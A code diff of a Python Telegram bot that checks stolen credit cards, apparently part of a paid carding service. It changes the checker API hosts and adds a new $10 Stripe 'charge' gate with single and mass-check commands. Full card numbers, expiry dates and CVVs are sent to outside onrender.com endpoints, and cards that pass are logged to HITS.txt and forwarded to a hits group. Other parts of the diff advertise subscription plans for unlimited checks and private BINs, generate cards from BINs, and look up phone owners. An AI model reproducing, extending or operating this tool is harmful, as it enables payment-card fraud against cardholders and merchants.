@@ -518,7 +518,7 @@ def check_new_api_cc(cc):
         # API request
         try:
             response = requests.get(
-                f"https://paypal-1-1bpd.onrender.com/gate=stripe3/keydarkwaslost/cc={formatted_cc}",
+                f"https://api-sp-storm.onrender.com/gate=stripe3/keydarkwaslost/cc={formatted_cc}",
                 timeout=120
             )
             if response.status_code == 200:
@@ -932,7 +932,7 @@ def check_vbv_cc(cc):
                     if any(x in clean_status for x in ['PASS', 'APPROVE', 'SUCCESS', 'LIVE']):
                         final_status = 'APPROVED'
                         # Clean message by removing success indicators
-                        message = message.replace('✅', '').replace('✓', '').strip()
+                        message = message.replace('✅', '').replace('✧', '').strip()
                         with open('HITS.txt','a') as hits:
                             hits.write(card+'\n')
                     else:
@@ -1410,7 +1410,7 @@ def format_single_response(result, user_full_name, processing_time):
 ⌯ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲↣ {result['country']}
 
 ⌯ 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲↣ {user_full_name}[{user_status}]
-⌯ 𝐁𝐨𝐭 𝐁𝐲↣⎯꯭𖣐᪵‌ 𝑫𝒂𝒓𝒌𝒃𝒐𝒚 𝑿⁷ ꯭ 𓆩⃟🦅
+⌯ 𝐁𝐨𝐭 𝐁𝐲↣⎯꯭𖣐᪵‌ 𝑫𝒂𝒓𝒌𝒃𝒐𝒚 ◄⏤‌‌ꭙ‌‌⁷ ꯭ 𓆩⃟🦅
 ⌯ 𝗧𝗶𝗺𝗲↣ {processing_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
 """
     return response
@@ -1728,16 +1728,22 @@ def callback_query(call):
                 chat_id=call.message.chat.id,
                 message_id=call.message.message_id,
                 caption="""
-✧ NAME: Stripe Charged
+✧ NAME: Stripe Charged 1
+✧ CMD: /sx [Single]
+✧ CMD: /msx [Mass]
+✧ Charge: $1.00
+✧ Status: Active ✅
+
+✧ NAME: Stripe Charged 2
 ✧ CMD: /st [Single]
 ✧ CMD: /mst [Mass]
 ✧ Charge: $5.00
 ✧ Status: Active ✅
 
-✧ NAME: Stripe Charged
-✧ CMD: /sx [Single]
-✧ CMD: /msx [Mass]
-✧ Charge: $1.00
+✧ NAME: Stripe Charged 3
+✧ CMD: /sf [Single]
+✧ CMD: /msf [Mass]
+✧ Charge: $10.00
 ✧ Status: Active ✅
 """,
                 reply_markup=create_charged_submenu()
@@ -1856,33 +1862,33 @@ def callback_query(call):
 ┗━━━━━━━━━━━⊛
 ━━━━━━━━━━━━━━━━━━
 ➤ 7 Days Plan - $3 💰
-✓ Unlimited CC Checks
-✓ No Flood Control
-✓ Standard Support
-✓ Rank : Basic Plan
-✓ Use in DMs
-✓ Increased mass check limit (30)
+✧ Unlimited CC Checks
+✧ No Flood Control
+✧ Standard Support
+✧ Rank : Basic Plan
+✧ Use in DMs
+✧ Increased mass check limit (30)
 ─━─━─━─━─━─
 ➤ 15 Days Plan - $6 💰
-✓ Unlimited CC Checks
-✓ No Flood Control
-✓ Priority Support
-✓ Access to Private BINs
-✓ Rank : Standard Plan
-✓ Use in DMs
-✓ Increased mass check limit (30)
+✧ Unlimited CC Checks
+✧ No Flood Control
+✧ Priority Support
+✧ Access to Private BINs
+✧ Rank : Standard Plan
+✧ Use in DMs
+✧ Increased mass check limit (30)
 ─━─━─━─━─━─
 ➤ 30 Days Plan - $10 💰
-✓ Unlimited CC Checks
-✓ No Flood Control
-✓ VIP Support (Faster Response)
-✓ Access to Private BINs
-✓ Early Access to New Features
-✓ Rank : Primium Plan
-✓ Use in DMs
-✓ Increased mass check limit (30)
+✧ Unlimited CC Checks
+✧ No Flood Control
+✧ VIP Support (Faster Response)
+✧ Access to Private BINs
+✧ Early Access to New Features
+✧ Rank : Primium Plan
+✧ Use in DMs
+✧ Increased mass check limit (30)
 ─━─━─━─━─━─
-➥ Payment Method:
+✧ Payment Method:
 💳 UPI ID: `DM`
 📩 Contact: @darkboy336 to purchase
 ━━━━━━━━━━━━━━━━━━
@@ -2079,8 +2085,8 @@ def handle_generate(message):
 𝗥𝗲𝗱𝗲𝗲𝗺 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 ✅
 
 ✧ 𝘈𝘮𝘰𝘶𝘯𝘵 : {num_keys} 
-✧ �𝘷𝘢𝘭𝘶𝘦: 10 credits each
-✧ �𝘷𝘢𝘭𝘪𝘥𝘪𝘵𝘺: 5 days
+✧ 𝘷𝘢𝘭𝘶𝘦: 10 credits each
+✧ 𝘷𝘢𝘭𝘪𝘥𝘪𝘵𝘺: 5 days
 
 {keys_list}
 
@@ -2320,33 +2326,33 @@ def handle_buy(message):
 ┗━━━━━━━━━━━⊛
 ━━━━━━━━━━━━━━━━━━
 ➤ 7 Days Plan - $3 💰
-✓ Unlimited CC Checks
-✓ No Flood Control
-✓ Standard Support
-✓ Rank : Basic Plan
-✓ Use in DMs
-✓ Increased mass check limit (30)
+✧ Unlimited CC Checks
+✧ No Flood Control
+✧ Standard Support
+✧ Rank : Basic Plan
+✧ Use in DMs
+✧ Increased mass check limit (30)
 ─━─━─━─━─━─
 ➤ 15 Days Plan - $6 💰
-✓ Unlimited CC Checks
-✓ No Flood Control
-✓ Priority Support
-✓ Access to Private BINs
-✓ Rank : Standard Plan
-✓ Use in DMs
-✓ Increased mass check limit (30)
+✧ Unlimited CC Checks
+✧ No Flood Control
+✧ Priority Support
+✧ Access to Private BINs
+✧ Rank : Standard Plan
+✧ Use in DMs
+✧ Increased mass check limit (30)
 ─━─━─━─━─━─
 ➤ 30 Days Plan - $10 💰
-✓ Unlimited CC Checks
-✓ No Flood Control
-✓ VIP Support (Faster Response)
-✓ Access to Private BINs
-✓ Early Access to New Features
-✓ Rank : Primium Plan
-✓ Use in DMs
-✓ Increased mass check limit (30)
+✧ Unlimited CC Checks
+✧ No Flood Control
+✧ VIP Support (Faster Response)
+✧ Access to Private BINs
+✧ Early Access to New Features
+✧ Rank : Primium Plan
+✧ Use in DMs
+✧ Increased mass check limit (30)
 ─━─━─━─━─━─
-➥ Payment Method:
+✧ Payment Method:
 💳 UPI ID: <code>DM</code>
 📩 Contact: @darkboy336 to purchase
 ━━━━━━━━━━━━━━━━━━
@@ -2395,14 +2401,14 @@ def handle_bin(message):
 ┃ BIN Information
 ┗━━━━━━━━━━━⊛
 
-キ BIN: <code>{bin_number[:6]}</code>
-ア Bank: {bin_info.get('bank', 'N/A')}
-ヰ Brand: {bin_info.get('brand', 'N/A')}
-零 Type: {bin_info.get('type', 'N/A')}
-朱 Country: {bin_info.get('country_name', 'N/A')} {bin_info.get('country_flag', '🌐')}
-ヰ Level: {bin_info.get('level', 'N/A')}
+✧ BIN: <code>{bin_number[:6]}</code>
+✧ Bank: {bin_info.get('bank', 'N/A')}
+✧ Brand: {bin_info.get('brand', 'N/A')}
+✧ Type: {bin_info.get('type', 'N/A')}
+✧ Country: {bin_info.get('country_name', 'N/A')} {bin_info.get('country_flag', '🌐')}
+✧ Level: {bin_info.get('level', 'N/A')}
 
-カ Checked By: {message.from_user.first_name}
+✧ Checked By: {message.from_user.first_name}
 """
                 bot.edit_message_text(chat_id=message.chat.id,
                                     message_id=status_msg.message_id,
@@ -3956,6 +3962,7 @@ def handle_gen(message):
 <pre>Generated 10 CCs 💳</pre>
 
 {formatted_ccs}
+
 <pre>BIN-LOOKUP
 BIN: {bin_input}
 Country: {country_name} {flag}
@@ -4126,7 +4133,7 @@ def handle_ping(message):
 ✧ RAM Usage: <code>{memory}%</code>
 ✧ System: <code>{system} ({arch})</code>
 
-✧ Bot By: @Darkboy336
+✧ Bot By: ⎯꯭𖣐᪵̽𐎓⏤‌‌𝑫𝒂𝒓𝒌𝒃𝒐𝒚 ◄⏤‌‌ꭙ‌‌⁷ ꯭ ꯭𖠌𝆺꯭𝅥᪳𝆭࿐ 𓆩⃟🦅
 """
         bot.reply_to(message, response, parse_mode="HTML")
         
@@ -4312,14 +4319,14 @@ def handle_gate_check(message):
 ┃ 𝗟𝗼𝗼𝗸𝘂𝗽 𝗥𝗲𝘀𝘂𝗹𝘁  ✅ 
 ┗━━━━━━━━━━━━⊛
 ─━─━─━─━─━─━─━─━─━─
-➥ 𝗦𝗶𝘁𝗲 -» <code>{final_url}</code> 
-➥ 𝗣𝗮𝘆𝗺𝗲𝗻𝘁 𝗚𝗮𝘁𝗲𝘄𝗮𝘆𝘀 -» <code>{gateways}</code> 
-➥ 𝗖𝗮𝗽𝘁𝗰𝗵𝗮 -» <code>{captcha}</code> 
-➥ 𝗖𝗹𝗼𝘂𝗱𝗳𝗹𝗮𝗿𝗲 -» <code>{cloudflare}</code> 
-➥ 𝗦𝗲𝗰𝘂𝗿𝗶𝘁𝘆 -» {security}
-➥ 𝗖𝗩𝗩/𝗖𝗩𝗖 -» {cvv}
-➥ 𝗜𝗻𝗯𝘂𝗶𝗹𝘁 𝗦𝘆𝘀𝘁𝗲𝗺 -» {inbuilt}
-➥ 𝗦𝘁𝗮𝘁𝘂𝘀 -» {status_code}
+✧ 𝗦𝗶𝘁𝗲 -» <code>{final_url}</code> 
+✧ 𝗣𝗮𝘆𝗺𝗲𝗻𝘁 𝗚𝗮𝘁𝗲𝘄𝗮𝘆𝘀 -» <code>{gateways}</code> 
+✧ 𝗖𝗮𝗽𝘁𝗰𝗵𝗮 -» <code>{captcha}</code> 
+✧ 𝗖𝗹𝗼𝘂𝗱𝗳𝗹𝗮𝗿𝗲 -» <code>{cloudflare}</code> 
+✧ 𝗦𝗲𝗰𝘂𝗿𝗶𝘁𝘆 -» {security}
+✧ 𝗖𝗩𝗩/𝗖𝗩𝗖 -» {cvv}
+✧ 𝗜𝗻𝗯𝘂𝗶𝗹𝘁 𝗦𝘆𝘀𝘁𝗲𝗺 -» {inbuilt}
+✧ 𝗦𝘁𝗮𝘁𝘂𝘀 -» {status_code}
 ─━─━─━─━─━─━─━─━─━─
 """
         bot.edit_message_text(chat_id=message.chat.id,
@@ -4954,14 +4961,15 @@ def handle_truecaller_check(message):
 ┃ Phone Number Info
 ┗━━━━━━━━━━━⊛
 
+✧ Truecaller    : <code>{data.get('Truecaller', 'No name found')}</code>
+✧ Unknown       : <code>{data.get('Unknown', 'N/A')}</code>
+
 ✧ Carrier       : <code>{data.get('carrier', 'N/A')}</code>
 ✧ Country       : <code>{data.get('country', 'N/A')}</code>
 ✧ Intl. Format  : <code>{data.get('international_format', 'N/A')}</code>
+
 ✧ Location      : <code>{data.get('location', 'N/A')}</code>
 ✧ Timezones     : <code>{', '.join(data.get('timezones', []))}</code>
-
-✧ Truecaller    : <code>{data.get('Truecaller', 'No name found')}</code>
-✧ Unknown       : <code>{data.get('Unknown', 'N/A')}</code>
 ✧ Timestamp     : <code>{timestamp}</code>
 """
 
@@ -8551,7 +8559,7 @@ def check_sp_api_cc(cc):
         # API request
         try:
             response = requests.get(
-                f"https://api-xy7c.onrender.com/gate=stripe4/keydarkwaslost/cc={formatted_cc}",
+                f"https://api-sp-storm.onrender.com/gate=stripe4/keydarkwaslost/cc={formatted_cc}",
                 timeout=120
             )
             if response.status_code == 200:
@@ -9280,6 +9288,321 @@ def handle_mah(message):
                             'country': 'UNKNOWN 🌐',
                             'type': 'UNKNOWN',
                             'gateway': 'AuthNet [5$]'
+                        })
+                        processing_time = time.time() - start_time
+                        response_text = format_mchk_response(results, len(cards), processing_time, i)
+                        bot.edit_message_text(chat_id=message.chat.id,
+                                            message_id=status_msg.message_id,
+                                            text=response_text,
+                                            parse_mode='HTML')
+                
+                processing_time = time.time() - start_time
+                response_text = format_mchk_response(results, len(cards), processing_time)
+                bot.edit_message_text(chat_id=message.chat.id,
+                                    message_id=status_msg.message_id,
+                                    text=response_text,
+                                    parse_mode='HTML')
+            
+            except Exception as e:
+                bot.edit_message_text(chat_id=message.chat.id,
+                                     message_id=status_msg.message_id,
+                                     text=f"❌ An error occurred: {str(e)}",
+                                     parse_mode='HTML')
+        
+        threading.Thread(target=check_cards).start()
+    
+    except Exception as e:
+        bot.reply_to(message, f"❌ An error occurred: {str(e)}")
+
+def check_sf_cc(cc):
+    try:
+        card = cc.replace('/', '|')
+        lista = card.split("|")
+        cc = lista[0]
+        mm = lista[1]
+        yy = lista[2]
+        if "20" in yy:
+            yy = yy.split("20")[1]
+        cvv = lista[3]
+        
+        # Get BIN info
+        bin_info = None
+        try:
+            bin_response = requests.get(f"https://bins.antipublic.cc/bins/{cc[:6]}", timeout=5)
+            if bin_response.status_code == 200:
+                bin_info = bin_response.json()
+        except:
+            pass
+            
+        # Set default values if BIN lookup failed
+        brand = bin_info.get('brand', 'UNKNOWN') if bin_info else 'UNKNOWN'
+        country_name = bin_info.get('country_name', 'UNKNOWN') if bin_info else 'UNKNOWN'
+        country_flag = bin_info.get('country_flag', '🌐') if bin_info else '🌐'
+        card_type = bin_info.get('type', 'UNKNOWN') if bin_info else 'UNKNOWN'
+        bank = bin_info.get('bank', 'UNKNOWN') if bin_info else 'UNKNOWN'
+        
+        # Prepare card for API
+        formatted_cc = f"{cc}|{mm}|{yy}|{cvv}"
+        
+        try:
+            response = requests.get(SF_API_URL.format(formatted_cc), timeout=120)
+            if response.status_code == 200:
+                try:
+                    data = response.json()
+                except json.JSONDecodeError:
+                    return {
+                        'status': 'ERROR',
+                        'card': card,
+                        'message': 'Invalid API response',
+                        'brand': brand,
+                        'country': f"{country_name} {country_flag}",
+                        'type': card_type,
+                        'gateway': 'Stripe [10$]'
+                    }
+                    
+                status = data.get('status', 'Declined ❌').replace('Declined ❌', 'DECLINED').replace('Declined \u274c', 'DECLINED')
+                message = data.get('response', 'Your card was declined.')
+                
+                if 'Live' in status or 'Approved' in status:
+                    status = 'APPROVED'
+                    with open('HITS.txt','a') as hits:
+                        hits.write(card+'\n')
+                    return {
+                        'status': 'APPROVED',
+                        'card': card,
+                        'message': message,
+                        'brand': brand,
+                        'country': f"{country_name} {country_flag}",
+                        'type': card_type,
+                        'gateway': 'Stripe [10$]'
+                    }
+                else:
+                    return {
+                        'status': 'DECLINED',
+                        'card': card,
+                        'message': message,
+                        'brand': brand,
+                        'country': f"{country_name} {country_flag}",
+                        'type': card_type,
+                        'gateway': 'Stripe [10$]'
+                    }
+            else:
+                return {
+                    'status': 'ERROR',
+                    'card': card,
+                    'message': f'API Error: {response.status_code}',
+                    'brand': brand,
+                    'country': f"{country_name} {country_flag}",
+                    'type': card_type,
+                    'gateway': 'Stripe [10$]'
+                }
+        except requests.exceptions.Timeout:
+            return {
+                'status': 'ERROR',
+                'card': card,
+                'message': 'API Timeout',
+                'brand': brand,
+                'country': f"{country_name} {country_flag}",
+                'type': card_type,
+                'gateway': 'Stripe [10$]'
+            }
+        except Exception as e:
+            return {
+                'status': 'ERROR',
+                'card': card,
+                'message': str(e),
+                'brand': brand,
+                'country': f"{country_name} {country_flag}",
+                'type': card_type,
+                'gateway': 'Stripe [10$]'
+            }
+            
+    except Exception as e:
+        return {
+            'status': 'ERROR',
+            'card': card,
+            'message': 'Invalid Input',
+            'brand': 'UNKNOWN',
+            'country': 'UNKNOWN 🌐',
+            'type': 'UNKNOWN',
+            'gateway': 'Stripe [10$]'
+        }
+
+# Handle both /cc and .cc
+@bot.message_handler(commands=['cc'])
+@bot.message_handler(func=lambda m: m.text and m.text.startswith('.cc'))
+def handle_cc(message):
+    # Check if user is allowed to use in DMs
+    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
+        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
+        return
+    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
+        bot.reply_to(message, "❌ This group is not approved to use this bot.")
+        return
+
+    if not confirm_time():
+        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
+        return
+
+    # Check flood control for non-subscribed users
+    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
+        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
+        return
+
+    # Check credits for non-subscribed users
+    if not is_user_subscribed(message.from_user.id):
+        if not check_user_credits(message.from_user.id, 1):
+            remaining = get_remaining_credits(message.from_user.id)
+            bot.reply_to(message, f"❌ You've used all your daily credits ({DAILY_CREDITS}). Remaining: {remaining}. Subscribe or wait for daily reset.")
+            return
+        deduct_credits(message.from_user.id, 1)
+
+    try:
+        # Extract card from message or reply
+        if message.text.startswith('/'):
+            parts = message.text.split()
+            if len(parts) < 2:
+                if message.reply_to_message:
+                    cc = message.reply_to_message.text.strip()
+                else:
+                    bot.reply_to(message, "❌ Invalid format. Use /sf CC|MM|YYYY|CVV or .cc CC|MM|YYYY|CVV")
+                    return
+            else:
+                cc = parts[1]
+        else:
+            cc = message.text[4:].strip()
+
+        start_time = time.time()
+
+        user_full_name = message.from_user.first_name
+        if message.from_user.last_name:
+            user_full_name += " " + message.from_user.last_name
+
+        status_msg = bot.reply_to(
+            message,
+            "↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>Stripe [10$]</i> \n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>".format(cc),
+            parse_mode='HTML'
+        )
+
+        def check_card():
+            try:
+                result = check_sf_cc(cc)
+                result['user_id'] = message.from_user.id  # Added line to include user ID
+                processing_time = time.time() - start_time
+                response_text = format_single_response(result, user_full_name, processing_time)
+
+                # Send result to user
+                bot.edit_message_text(chat_id=message.chat.id,
+                                      message_id=status_msg.message_id,
+                                      text=response_text,
+                                      parse_mode='HTML')
+
+                # Auto forward hits
+                try:
+                    if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
+                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
+                except Exception as e:
+                    print(f"[Auto Forward Error - /sf] {e}")
+
+            except Exception as e:
+                bot.edit_message_text(chat_id=message.chat.id,
+                                      message_id=status_msg.message_id,
+                                      text=f"❌ An error occurred: {str(e)}")
+
+        threading.Thread(target=check_card).start()
+
+    except Exception as e:
+        bot.reply_to(message, f"❌ Error: {str(e)}")
+
+# Handle both /mcc and .mcc
+@bot.message_handler(commands=['msf'])
+@bot.message_handler(func=lambda m: m.text and m.text.startswith('.msf'))
+def handle_msf(message):
+    # Check if user is allowed to use in DMs
+    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
+        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
+        return
+    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
+        bot.reply_to(message, "❌ This group is not approved to use this bot.")
+        return
+    
+    if not confirm_time():
+        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
+        return
+    
+    # Check if user is subscribed
+    if not is_user_subscribed(message.from_user.id):
+        bot.reply_to(message, "❌ This command is only for subscribed users. Buy a plan to use this feature.")
+        return
+    
+    # Check mass check cooldown
+    if not check_mass_check_cooldown(message.from_user.id):
+        bot.reply_to(message, "⚠️ You are doing things too fast! Please wait 20 seconds between mass checks.")
+        return
+    
+    try:
+        cards_text = None
+        command_parts = message.text.split()
+        
+        # Check if cards are provided after command
+        if len(command_parts) > 1:
+            cards_text = ' '.join(command_parts[1:])
+        elif message.reply_to_message:
+            cards_text = message.reply_to_message.text
+        else:
+            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
+            return
+            
+        cards = []
+        for line in cards_text.split('\n'):
+            line = line.strip()
+            if line:
+                for card in line.split():
+                    if '|' in card:
+                        cards.append(card.strip())
+        
+        if not cards:
+            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YYYY|CVV).")
+            return
+        
+        # Determine max limit based on subscription status
+        max_limit = MAX_SUBSCRIBED_CARDS_LIMIT if is_user_subscribed(message.from_user.id) else MAX_CARDS_LIMIT
+        
+        if len(cards) > max_limit:
+            cards = cards[:max_limit]
+            bot.reply_to(message, f"⚠️ Maximum {max_limit} cards allowed. Checking first {max_limit} cards only.")
+        
+        start_time = time.time()
+            
+        user_full_name = message.from_user.first_name
+        if message.from_user.last_name:
+            user_full_name += " " + message.from_user.last_name
+            
+        status_msg = bot.reply_to(message, f"↯ Checking {len(cards)} cards...", parse_mode='HTML')
+        
+        def check_cards():
+            try:
+                results = []
+                for i, card in enumerate(cards, 1):
+                    try:
+                        result = check_sf_cc(card)
+                        results.append(result)
+                        
+                        processing_time = time.time() - start_time
+                        response_text = format_mchk_response(results, len(cards), processing_time, i)
+                        bot.edit_message_text(chat_id=message.chat.id,
+                                            message_id=status_msg.message_id,
+                                            text=response_text,
+                                            parse_mode='HTML')
+                    except Exception as e:
+                        results.append({
+                            'status': 'ERROR',
+                            'card': card,
+                            'message': f'Invalid: {str(e)}',
+                            'brand': 'UNKNOWN',
+                            'country': 'UNKNOWN 🌐',
+                            'type': 'UNKNOWN',
+                            'gateway': 'Stripe [10$]'
                         })
                         processing_time = time.time() - start_time
                         response_text = format_mchk_response(results, len(cards), processing_time, i)
